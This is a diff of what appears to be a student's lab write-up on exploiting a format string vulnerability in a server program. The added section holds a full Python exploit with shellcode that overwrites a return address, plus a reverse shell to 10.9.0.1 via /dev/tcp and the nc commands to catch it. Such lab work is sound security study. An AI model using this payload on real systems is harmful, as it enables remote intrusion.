@@ -845,11 +845,11 @@ For this task, I need to determine the total number of characters I would need t
 #!/usr/bin/python3
 import sys
 
-target = 0x0000555555558010
-t1     = 0x0000555555558016    # <= 0xAAAA
-t2     = 0x0000555555558014    # <= 0xBBBB
-t3     = 0x0000555555558012    # <= 0xCCCC
-t4     = target                # <= 0xDDDD
+#target = 0x0000555555558010
+t1      = 0x0000555555558016    # <= 0xAAAA
+t2      = 0x0000555555558014    # <= 0xBBBB
+t3      = 0x0000555555558012    # <= 0xCCCC
+t4      = 0x0000555555558010    # <= 0xDDDD
 
 # Create format string
 # I padded zeros to keep the lenght at 16-bytes
@@ -876,24 +876,123 @@ with open('badfile', 'wb') as f:
 **image**
 
 
-#### Inject Malicious Code into the Server Program
+#### Inject Malicious Code into the Server Program (A reverse shell)
 
-This task involves injecting a piece of malicious code, in its binary format, into the server’s memory, and then use the format string vulnerability to modify the return address field of a function, so when the function returns, it jumps to our injected code.
+This task involves injecting a piece of malicious code, in its binary format, into the server’s memory, and then use the format string vulnerability to modify the return address field of a function, so when the function returns, it jumps to our injected code - a reverse shell.
 
 In order to inject malicious code into the server program, we would need to modify the value that is stored in the return address of the function we are exploiting. This lab has been designed in such a way that when the program runs, it prints out certain values for the student.
 
 We would be needing two values:
+- the frame-pointer address inside the vulnerable function
+- the input buffer's address
 
-the frame-pointer address inside the vulnerable function
-the input buffer's address
 From the information the server prints out, we can determine these values to be:
+- 0x00007FFFFFFFE0D0 (frame-pointer address)
+- 0x00007FFFFFFFE190 (input buffer's address)
 
-ffffd188 (frame-pointer address)
-ffffd260 (input buffer's address)
 When we build our attack string, it will consist of the following:
+- the return address of the vulnerable function = frame-pointer address + 8
+- the memory address of our malicious code = the input buffer's address + (a value yet to be determined)
+- the malicious code
 
-the return address of the vulnerable function
-frame-pointer address + 4
-the memory address of our malicious code:
-the input buffer's address + (a value yet to be determined)
-the malicious code
+**image**
+
+The code we will use to attack the server is as follows:
+
+```python
+#!/usr/bin/python3
+import sys
+
+# 32-bit Generic Shellcode 
+shellcode_32 = (
+   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
+   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
+   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
+   "/bin/bash*"
+   "-c*"
+   # The * in this line serves as the position marker         *
+   "/bin/ls -l; echo '===== Success! ======'                  *"
+   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
+   "BBBB"   # Placeholder for argv[1] --> "-c"
+   "CCCC"   # Placeholder for argv[2] --> the command string
+   "DDDD"   # Placeholder for argv[3] --> NULL
+).encode('latin-1')
+
+
+# 64-bit Generic Shellcode 
+shellcode_64 = (
+   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
+   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
+   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
+   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
+   "/bin/bash*"
+   "-c*"
+   # The * in this line serves as the position marker         *
+   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
+   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
+   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
+   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
+   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
+).encode('latin-1')
+
+# Choose the shellcode version based on your target
+shellcode = shellcode_64
+
+############################################################
+#    Construct the format string here                      #
+############################################################
+
+# return address    = 0x00007fffffffe0d8
+# buffer address    = 0x00007fffffffe190
+# shellcode address = 0x00007fffffffe190 + 0x48 = 0x00007fffffffe1d8
+
+r1 = 0x00007fffffffe0d8         # <-- 0xe1d8
+r2 = 0x00007fffffffe0d8 + 2     # <-- 0xffff
+r3 = 0x00007fffffffe0d8 + 4     # <-- 0x7fff
+r4 = 0x00007fffffffe0d8 + 6     # <-- 0x0000
+
+# Create format string
+content = ("%.0032767x%40$hn").encode('latin-1')
+content += ("%.0025049x%41$hn").encode('latin-1')
+content += ("%.0007719x%42$hn").encode('latin-1')
+
+# Append addresses
+content += (r3).to_bytes(8,byteorder='little')
+content += (r1).to_bytes(8,byteorder='little')
+content += (r2).to_bytes(8,byteorder='little')
+
+# determine the size of content before adding the shellcode
+#print(f"size of content before shellcode = {len(content)}")    # -> 72 = 0x48
+
+# shellcode
+content += shellcode
+
+
+# Save the format string to file
+with open('badfile', 'wb') as f:
+  print(f"writing {len(content)} bytes to badfile...")
+  f.write(content)
+```
+
+Next is to set up a listener...
+
+```bash
+nc -nvl 9090
+```
+
+then run the attack.
+```bash
+python3 badfile.py
+cat badfile | nc -w2 10.9.0.5 9090
+```
+
+**image**
+
+<details>
+<summary>Code explanation</summary>
+<div markdown="1">
+
+
+
+</div></details>
+
